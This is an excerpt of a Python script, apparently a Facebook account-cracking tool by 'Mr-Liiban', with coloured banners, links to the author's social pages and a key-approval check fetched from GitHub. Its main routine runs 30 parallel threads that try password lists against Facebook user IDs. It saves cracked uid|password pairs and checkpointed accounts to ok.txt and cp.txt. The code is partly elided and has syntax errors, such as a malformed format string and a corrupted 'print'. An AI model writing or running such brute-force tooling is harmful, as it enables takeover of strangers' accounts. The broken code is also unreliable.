...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m LIIBAN\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :4\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
 """)
def logo2():
	...
	print ("""
   __ __ 
_ _ _ ___ ____ _ _ | | | |__] |__| |\ | |___ | | |__] | | | \| 
                                        √MR LIIBAN❤️                                                                            
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m LIIBAN\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :4\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Liiban \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Liiban1 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/Liiban666 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Liiban1/Aproval.txt/tree/main"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/Liiban666")
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/Liiban666")
	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(,https://t.me/+ffTra4LxrqhhMWVk))
	runtxt("\033[0;97m Key group admin ke post pe coment krein")
	os.system("xdg-open https://www.facebook.com/Liiban666")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Liiban666"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Liiban1/run.txt/blob/main/run.txt').text
			if basesplit in plr:
				key = basesplit
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				logo2()
				print("───────────────────────────────────────────────────────× ")
				print("\033[0;92m[=×>]\033[0;92m OGAYSIIS: BEFORE LOGIN CP IDZ ")
				print("\033[0;92m[=×>]\033[0;92m OGAYSIIS: CLEAR YOUR FACEBOOK /BROWSER DATA " )
				print("\033[0;92m[=×>]\033[0;92m OGAYSIIS : ENJOY FREE TOOL")
				print("\033[0;92m[=×>]\033[0;92m OGAYSIIS : HAR 10 MIN BAD AIRPLAN MOD/FLIGHT MOD ON KRO ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=LIIBAN=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=LIIBAN=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				pr#35D525int("\r  \033[0;92m   [=LIIBAN=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=LIIBAN=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #Waxaa diyaasrhay MR_ LIIBAN
